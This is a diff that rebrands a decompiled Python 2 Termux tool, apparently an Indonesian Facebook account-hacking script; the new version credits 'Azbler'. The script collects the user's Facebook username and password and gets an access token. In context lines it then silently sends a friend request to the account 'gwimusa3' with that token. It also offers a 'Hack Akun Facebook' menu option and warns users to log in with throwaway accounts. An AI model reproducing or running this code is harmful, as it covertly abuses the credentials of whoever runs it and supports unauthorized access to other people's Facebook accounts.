@@ -1,4 +1,4 @@
-#Decompiled by MiSetya
+#Decompiled by Azrulnzm
 import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, mechanize
 from multiprocessing.pool import ThreadPool
 
@@ -23,13 +23,13 @@ def jalan(z):
         time.sleep(0.01)
 
 
-logo = '\x1b[1;92m\n\xe2\x95\x94\xe2\x95\xa6\xe2\x95\x97\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x8c\xe2\x94\x80   \xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97 \n \xe2\x95\x91\xe2\x95\x91\xe2\x94\x9c\xe2\x94\x80\xe2\x94\xa4\xe2\x94\x9c\xe2\x94\xac\xe2\x94\x98\xe2\x94\x9c\xe2\x94\xb4\xe2\x94\x90\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\xa0\xe2\x95\xa3 \xe2\x95\xa0\xe2\x95\xa9\xe2\x95\x97\n\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x9d\xe2\x94\xb4 \xe2\x94\xb4\xe2\x94\xb4\xe2\x94\x94\xe2\x94\x80\xe2\x94\xb4 \xe2\x94\xb4   \xe2\x95\x9a  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \x1b[1;93mNEW\n\x1b[1;93m* \x1b[1;97mCreated by  \x1b[1;91m: \x1b[1;96mMiSetya\x1b[1;97m\n\x1b[1;93m* \x1b[1;97mSupported \x1b[1;91m: \x1b[1;96mTeam Termux NooB\x1b[1;97m/ \x1b[1;96mGUNAKAN DENGAN BAIK TOD!\x1b[1;97m/ \x1b[1;96mBerpikir dengan bijak!\n\x1b[1;93m* \x1b[1;97mGitHub  \x1b[1;91m: \x1b[1;92m\x1b[4mhttps://github.com/MiSetya\x1b[0m\n[*] Kalo akun lu kena CP gua gak tanggung jawab ya Tod!\n[*] Gunakan akun tumbal\n[*] Script gampang Checkpoint\n'
+logo = '\x1b[1;92m\n\xe2\x95\x94\xe2\x95\xa6\xe2\x95\x97\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x8c\xe2\x94\x80   \xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97 \n \xe2\x95\x91\xe2\x95\x91\xe2\x94\x9c\xe2\x94\x80\xe2\x94\xa4\xe2\x94\x9c\xe2\x94\xac\xe2\x94\x98\xe2\x94\x9c\xe2\x94\xb4\xe2\x94\x90\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\xa0\xe2\x95\xa3 \xe2\x95\xa0\xe2\x95\xa9\xe2\x95\x97\n\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x9d\xe2\x94\xb4 \xe2\x94\xb4\xe2\x94\xb4\xe2\x94\x94\xe2\x94\x80\xe2\x94\xb4 \xe2\x94\xb4   \xe2\x95\x9a  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \x1b[1;93mNEW\n\x1b[1;93m* \x1b[1;97mCreated by  \x1b[1;91m: \x1b[1;96mAzbler\x1b[1;97m\n\x1b[1;93m* \x1b[1;97mSupported \x1b[1;91m: \x1b[1;96mDhanbler & Afikbler\x1b[1;97m/ \x1b[1;96mGUNAKAN DENGAN BAIK Y!\x1b[1;97m/ \x1b[1;96mBerpikir dengan bijak!\n\x1b[1;93m* \x1b[1;97mGitHub  \x1b[1;91m: \x1b[1;92m\x1b[4mhttps://github.com/AZ-BLER\x1b[0m\n[*] Kalo akun lu kena CP gua gak tanggung jawab Y!\n[*] Gunakan akun tumbal\n[*] Decompiled by AZ-BLER/n'
 
 def tik():
     titik = [
      '.   ', '..  ', '... ']
     for o in titik:
-        print '\r\x1b[1;91m[\xe2\x97\x8f] \x1b[1;92mSedang Masuk COK \x1b[1;97m' + o,
+        print '\r\x1b[1;91m[\xe2\x97\x8f] \x1b[1;92mSedang Masuk GAN \x1b[1;97m' + o,
         sys.stdout.flush()
         time.sleep(1)
 
@@ -65,9 +65,9 @@ def login():
         os.system('clear')
         print logo
         print 40 * '\x1b[1;97m\xe2\x95\x90'
-        print '\x1b[1;91m[\xe2\x98\x86] \x1b[1;92mLOGIN AKUN FACEBOOK LU TOD! \x1b[1;91m[\xe2\x98\x86]'
+        print '\x1b[1;91m[\xe2\x98\x86] \x1b[1;92mLOGIN AKUN FACEBOOK LU GAN! \x1b[1;91m[\xe2\x98\x86]'
         id = raw_input('\x1b[1;91m[+] \x1b[1;36mUsername FB/Nomor telepon \x1b[1;91m:\x1b[1;92m ')
-        pwd = getpass.getpass('\x1b[1;91m[+] \x1b[1;36mPassword FB lu \x1b[1;91m:\x1b[1;92m ')
+        pwd = getpass.getpass('\x1b[1;91m[+] \x1b[1;36mPassword FB \x1b[1;91m:\x1b[1;92m ')
         tik()
         try:
             br.open('https://m.facebook.com')
@@ -97,7 +97,7 @@ def login():
                 zedd.close()
                 print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin berhasil'
                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
-                os.system('xdg-open https://youtube.com/MiSetya')
+                os.system('xdg-open https://youtube.com/Azbler ZX')
                 time.sleep(2)
                 menu()
             except requests.exceptions.ConnectionError:
@@ -105,7 +105,7 @@ def login():
                 keluar()
 
         if 'checkpoint' in url:
-            print '\n\x1b[1;91m[!] \x1b[1;93mAkun lu kena Checkpoint'
+            print '\n\x1b[1;91m[!] \x1b[1;93mAkun Terkena Checkpoint'
             os.system('rm -rf login.txt')
             time.sleep(1)
             keluar()
@@ -148,7 +148,7 @@ def menu():
     print '\xe2\x95\x91\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m Nama \x1b[1;91m: \x1b[1;92m' + nama
     print '\x1b[1;97m\xe2\x95\x9a' + 40 * '\xe2\x95\x90'
     print '\x1b[1;37;40m1. Info Akun             '
-    print '\x1b[1;37;40m2. Hack Akun Facebook NEW'
+    print '\x1b[1;37;40m2. Hack Akun Facebook3   '
     print '\x1b[1;37;40m3. Bot                   '
     print '\x1b[1;37;40m4. Lainnya....           '
     print '\x1b[1;37;40m5. LogOut dari akun ini  '
@@ -177,7 +177,7 @@ def pilih():
                     else:
                         if zedd == '5':
                             os.system('rm -rf login.txt')
-                            os.system('xdg-open https://www.youtube.com/MiSetya')
+                            os.system('xdg-open https://www.youtube.com/Azbler ZX')
                             keluar()
                         else:
                             if zedd == '0':
@@ -201,7 +201,7 @@ def informasi():
     print logo
     print 40 * '\x1b[1;97m\xe2\x95\x90'
     id = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukan ID\x1b[1;97m/\x1b[1;92mNama\x1b[1;91m : \x1b[1;97m')
-    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mSabar anjing! \x1b[1;97m...')
+    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar! \x1b[1;97m...')
     r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
     cok = json.loads(r.text)
     for p in cok['data']:
